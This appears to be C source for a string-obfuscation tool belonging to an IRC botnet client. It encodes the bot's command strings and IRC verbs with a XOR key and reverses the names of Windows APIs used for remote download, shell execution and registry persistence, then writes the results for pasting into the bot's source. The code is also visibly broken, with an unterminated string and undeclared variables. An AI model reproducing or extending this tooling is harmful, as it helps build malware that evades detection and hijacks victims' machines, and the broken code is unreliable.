#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <tchar.h>

char *Encode_Decode(unsigned char *string, unsigned char *key)
{
	unsigned int i, j;

	for (i = 0; i < strlen(string); i++)
	{
		for (j = 0; j < strlen(key); j++)
			string[i] ^= key[j];

		string[i] = ~ string[i];
	}

	return string;
}

/* not really encryption, but keeps "stupid" people from knowing your cmds */
char* Reverse_Str(char* str)
{
    char *temp, *ptr;
    int len, i;

    temp=str;
    for(len=0; *temp !='\0';temp++, len++);

    ptr=malloc(sizeof(char)*(len+1));

    for(i=len-1; i>=0; i--)
        ptr[len-i-1]=str[i];

    ptr[len]='\0';
    return ptr;
}

int main()
{
 char pass[256];

 printf("\n                                _                 ");
 printf("\n                               | |                ");
 printf("\n _ __    __ _  _ __ ___    ___ | |  ___  ___  ___ ");
 printf("\n| '_ \\  / _` || '_ ` _ \\  / _ \\| | / _ \\/ __|/ __|");
 printf("\n| | | || (_| || | | | | ||  __/| ||  __/\__ \\__ \\");
 printf("\n|_| |_| \\__,_||_| |_| |_| \\___||_| \\__||___/|__/");

    printf("\n\n    What password/key would you like to use?\n");
    gets(pass);
    
    printf("\n                             
    scanf("%c %c",&yes, &no);
    if (yes=='y')
    {
    
    }

    /* COMMANDS */
    char cmd__RECONNECT[]          = "main.recon";  /* main.recon */
    char cmd__REMOVAL[]            = "main.removal"; /* main.removal */
    char cmd__JOIN[]               = "main.join"; /* main.join */
    char cmd__PART[]               = "main.part"; /* main. part */

    /* IRC */
    char str_nick[]                = "NICK";
    char str_user[]                = "USER";
    char str_privmsg[]             = "PRIVMSG";
    char str_notice[]              = "NOTICE";
    char str_pass[]                = "PASS";
    char str_join[]                = "JOIN";
    char str_part[]                = "PART";
    char str_quit[]                = "QUIT";
    char str_ping[]                = "PING";
    char str_pong[]                = "PONG";
    char str_my_443[]              = "443";
    char str_my_332[]              = "332";

    /* Shell32.dll */
    char shell32_[]             = "shell32.dll";
    char ShellExecute_[]        = "ShellExecuteA";

    /* Advapi32.dll */
    char advapi32_[]            = "Advapi32.dll";
    char RegCreateKeyEx_[]      = "RegCreateKeyExA";
    char RegSetValueEx_[]       = "RegSetValueExA";
    char RegCloseKey_[]         = "RegCloseKey";

    /* WS2_32.dll */
    char WS2_32[]              = "WS2_32.dll";
    char WSACleanup[]          = "WSACleanup";
    char WSAStartup[]          = "WSAStartup";
    char closesocket[]         = "closesocket";
    char connect[]             = "connect";
    char gethostbyname[]       = "gethostbyname";
    char htons[]               = "htons";
    char recv[]                = "recv";
    char send[]                = "send";
    char socket[]              = "socket";
    char inet_addr[]           = "inet_addr";
    char select[]              = "select";

    /*UrlMon.dll */
    char urlmon[]              = "urlmon.dll";
    char URLDownloadToFile[]   = "URLDownloadToFileA";

    char *str_nick2,*str_user2,*str_privmsg2,*str_notice2,*str_pass2,*str_join2,*str_part2,*str_quit2,*str_ping2,*str_pong2,*str_my_443_2,*str_my_332_2;
    char *shell32_2, *ShellExecute_2, *advapi32_2, *RegCreateKeyEx_2, *RegSetValueEx_2, *RegCloseKey_2;
    char *WS2_32_2, *WSACleanup_2, *WSAStartup_2, *closesocket_2, *connect_2, *gethostbyname_2, *htons_2, *recv_2, *send_2, *socket_2, *inet_addr_2, *select_2;
    char *urlmon_2, *URLDownloadToFile_2;
    char *cmd__JOIN_2, *cmd__PART_2, *cmd__RECONNECT_2, *cmd__REMOVAL_2;

     FILE *myFile = fopen("encrypted_strings.txt", "w");

     if ( myFile )
     {
     fprintf(myFile,"********NOTE********\n");
     fprintf(myFile,"*MAKE SURE YOU COPY + PASTE \nTHIS TO THE TOP OF\nTHE \"cryptn.c\" FILE!!! -Carve\n");
     fprintf(myFile,"********NOTE********\n\n\n");

     /* ENCRYPTION KEY */
     fprintf(myFile,"/* ENCRYPTION KEY */\n");
     fprintf(myFile,"char decode_pass[] = \"%s\";\n\n",pass);

     /* COMMANDS */
     cmd__RECONNECT_2 = Encode_Decode(cmd__RECONNECT,pass);
     cmd__REMOVAL_2 = Encode_Decode(cmd__REMOVAL,pass);
     cmd__JOIN_2 = Encode_Decode(cmd__JOIN,pass);
     cmd__PART_2 = Encode_Decode(cmd__PART,pass);

     /* IRC */
     str_nick2      = Encode_Decode(str_nick,pass);
     str_user2      = Encode_Decode(str_user,pass);
     str_privmsg2   = Encode_Decode(str_privmsg,pass);
     str_notice2    = Encode_Decode(str_notice,pass);
     str_pass2      = Encode_Decode(str_pass,pass);
     str_join2      = Encode_Decode(str_join,pass);
     str_part2      = Encode_Decode(str_part,pass);
     str_quit2      = Encode_Decode(str_quit,pass);
     str_ping2      = Encode_Decode(str_ping,pass);
     str_pong2      = Encode_Decode(str_pong,pass);
     str_my_443_2   = Encode_Decode(str_my_443,pass);
     str_my_332_2   = Encode_Decode(str_my_332,pass);


     /* DLLS\APIS */
     shell32_2      = Reverse_Str(shell32_);
     ShellExecute_2 = Reverse_Str(ShellExecute_);

     advapi32_2     = Reverse_Str(advapi32_);
     RegCreateKeyEx_2 = Reverse_Str(RegCreateKeyEx_);
     RegSetValueEx_2= Reverse_Str(RegSetValueEx_);
     RegCloseKey_2  = Reverse_Str(RegCloseKey_);

     WS2_32_2       = Reverse_Str(WS2_32);
     WSACleanup_2   = Reverse_Str(WSACleanup);
     WSAStartup_2   = Reverse_Str(WSAStartup);
     closesocket_2  = Reverse_Str(closesocket);
     connect_2      = Reverse_Str(connect);
     gethostbyname_2= Reverse_Str(gethostbyname);
     htons_2        = Reverse_Str(htons);
     recv_2         = Reverse_Str(recv);
     send_2         = Reverse_Str(send);
     socket_2       = Reverse_Str(socket);
     select_2       = Reverse_Str(select);
     inet_addr_2    = Reverse_Str(inet_addr);

     urlmon_2       = Reverse_Str(urlmon);
     URLDownloadToFile_2 = Reverse_Str(URLDownloadToFile);

     fprintf(myFile,"/* COMMANDS */\n");
     fprintf(myFile,"char cmd__RECONNECT[]       = \"%s\"; /* main.recon */\n",        cmd__RECONNECT_2);
     fprintf(myFile,"char cmd__REMOVAL[]         = \"%s\"; /* main.removal */\n",      cmd__REMOVAL_2);
     fprintf(myFile,"char cmd__JOIN[]            = \"%s\"; /* main.join */\n",         cmd__JOIN_2);
     fprintf(myFile,"char cmd__PART[]            = \"%s\"; /* main.part */\n",         cmd__PART_2);

     fprintf(myFile,"/* IRC */\n");
     fprintf(myFile,"char my_nick[]              = \"%s\";\n",      str_nick2);
     fprintf(myFile,"char my_user[]              = \"%s\";\n",    str_user2);
     fprintf(myFile,"char my_privmsg[]           = \"%s\";\n", str_privmsg2);
     fprintf(myFile,"char my_notice[]            = \"%s\";\n",  str_notice2);
     fprintf(myFile,"char my_pass[]              = \"%s\";\n",    str_pass2);
     fprintf(myFile,"char my_join[]              = \"%s\";\n",    str_join2);
     fprintf(myFile,"char my_part[]              = \"%s\";\n",    str_part2);
     fprintf(myFile,"char my_quit[]              = \"%s\";\n",    str_quit2);
     fprintf(myFile,"char my_P1N6[]              = \"%s\";\n",    str_ping2);
     fprintf(myFile,"char my_P0N6[]              = \"%s\";\n",    str_pong2);
     fprintf(myFile,"char my_4_4_3[]             = \"%s\";\n",     str_my_443_2);
     fprintf(myFile,"char my_3_3_2[]             = \"%s\";\n\n",     str_my_332_2);

     fprintf(myFile,"/* Shell32.dll */\n");
     fprintf(myFile,"char shell32_[]              = \"%s\";\n", shell32_2);
     fprintf(myFile,"char ShellExecute_[]         = \"%s\";\n\n", ShellExecute_2);

     fprintf(myFile,"/* Advapi32.dll */\n");
     fprintf(myFile,"char advapi32_[]             = \"%s\";\n", advapi32_2);
     fprintf(myFile,"char RegCreateKeyEx_[]       = \"%s\";\n", RegCreateKeyEx_2);
     fprintf(myFile,"char RegSetValueEx_[]        = \"%s\";\n", RegSetValueEx_2);
     fprintf(myFile,"char RegCloseKey_[]          = \"%s\";\n\n", RegCloseKey_2);


     fprintf(myFile,"/* WS2_32.DLL */\n");
     fprintf(myFile,"char WS2_32_[]              = \"%s\";\n",      WS2_32_2);
     fprintf(myFile,"char WSACleanup_[]          = \"%s\";\n",      WSACleanup_2);
     fprintf(myFile,"char WSAStartup_[]          = \"%s\";\n",      WSAStartup_2);
     fprintf(myFile,"char closesocket_[]         = \"%s\";\n",      closesocket_2);
     fprintf(myFile,"char connect_[]             = \"%s\";\n",      connect_2);
     fprintf(myFile,"char gethostbyname_[]       = \"%s\";\n",      gethostbyname_2);
     fprintf(myFile,"char htons_[]               = \"%s\";\n",      htons_2);
     fprintf(myFile,"char recv_[]                = \"%s\";\n",      recv_2);
     fprintf(myFile,"char send_[]                = \"%s\";\n",      send_2);
     fprintf(myFile,"char socket_[]              = \"%s\";\n",      socket_2);
     fprintf(myFile,"char select_[]              = \"%s\";\n",      select_2);
     fprintf(myFile,"char inet_addr_[]           = \"%s\";\n\n",    inet_addr_2);

     fprintf(myFile,"/*UrlMon.DLL */\n");
     fprintf(myFile,"char urlmon_[]              = \"%s\";\n",      urlmon_2);
     fprintf(myFile,"char URLDownloadToFile_[]   = \"%s\";\n",      URLDownloadToFile_2);

     fclose(myFile);

     return 0;
     }

}
